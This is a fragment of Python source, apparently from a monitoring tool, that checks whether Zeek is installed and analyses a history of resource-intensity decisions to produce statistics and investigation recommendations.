    def _check_zeek_availability(self) -> bool:
        """Check if Zeek is available."""
        try:
            # Check if Zeek is installed
            cmd = ["zeek", "--version"]
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return process.returncode == 0
        except Exception as e:
            self.logger.error(f"Zeek availability check failed: {e}")
            return False
    
    def _analyze_intensity_patterns(self, history: List) -> Dict[str, Any]:
        """Analyze intensity patterns for behavioral insights."""
        if not history:
            return {}
        
        intensities = [d.intensity_percent for d in history]
        reasons = [d.reason for d in history]
        
        # Analyze pattern characteristics
        pattern_analysis = {
            "total_decisions": len(history),
            "average_intensity": sum(intensities) / len(intensities),
            "intensity_variance": self._calculate_variance(intensities),
            "most_common_reason": max(set(reasons), key=reasons.count),
            "reason_distribution": self._count_reasons(reasons),
            "intensity_distribution": self._categorize_intensities(intensities),
            "pattern_consistency": self._assess_pattern_consistency(history)
        }
        
        return pattern_analysis
    
    def _calculate_variance(self, values: List[float]) -> float:
        """Calculate variance of a list of values."""
        if len(values) < 2:
            return 0.0
        mean = sum(values) / len(values)
        return sum((x - mean) ** 2 for x in values) / len(values)
    
    def _count_reasons(self, reasons: List[str]) -> Dict[str, int]:
        """Count occurrences of each reason."""
        from collections import Counter
        return dict(Counter(reasons))
    
    def _categorize_intensities(self, intensities: List[int]) -> Dict[str, int]:
        """Categorize intensities into ranges."""
        categories = {
            "low (0-25%)": 0,
            "medium (26-50%)": 0,
            "high (51-75%)": 0,
            "very_high (76-100%)": 0
        }
        
        for intensity in intensities:
            if intensity <= 25:
                categories["low (0-25%)"] += 1
            elif intensity <= 50:
                categories["medium (26-50%)"] += 1
            elif intensity <= 75:
                categories["high (51-75%)"] += 1
            else:
                categories["very_high (76-100%)"] += 1
        
        return categories
    
    def _assess_pattern_consistency(self, history: List) -> Dict[str, Any]:
        """Assess the consistency of intensity patterns."""
        if len(history) < 2:
            return {"consistency_score": 0.0, "pattern_type": "insufficient_data"}
        
        # Calculate consistency based on intensity changes
        changes = []
        for i in range(1, len(history)):
            change = abs(history[i].intensity_percent - history[i-1].intensity_percent)
            changes.append(change)
        
        avg_change = sum(changes) / len(changes)
        consistency_score = max(0, 100 - avg_change)  # Higher score = more consistent
        
        # Determine pattern type
        if consistency_score > 80:
            pattern_type = "very_consistent"
        elif consistency_score > 60:
            pattern_type = "moderately_consistent"
        elif consistency_score > 40:
            pattern_type = "variable"
        else:
            pattern_type = "highly_variable"
        
        return {
            "consistency_score": consistency_score,
            "pattern_type": pattern_type,
            "average_change": avg_change,
            "max_change": max(changes) if changes else 0
        }
    
    def _generate_intensity_recommendations(self, stats: Dict[str, Any], suspicious_patterns: List) -> List[str]:
        """Generate recommendations based on intensity analysis."""
        recommendations = []
        
        # Check for high average intensity
        avg_intensity = stats.get("average_intensity", 0)
        if avg_intensity > 70:
            recommendations.append("High average intensity detected - consider investigating for unauthorized resource usage")
        
        # Check for suspicious patterns
        if suspicious_patterns:
            recommendations.append(f"Found {len(suspicious_patterns)} suspicious patterns - recommend detailed investigation")
        
        # Check for rapid changes
        if stats.get("total_decisions", 0) > 50:
            recommendations.append("High decision frequency detected - may indicate aggressive resource management")
        
        # Check for ignored system state
        for pattern in suspicious_patterns:
            if pattern["type"] == "ignored_system_state":
                recommendations.append("System state being ignored - potential unauthorized activity")
        
        if not recommendations:
            recommendations.append("No immediate concerns detected - continue monitoring")
        
        return recommendations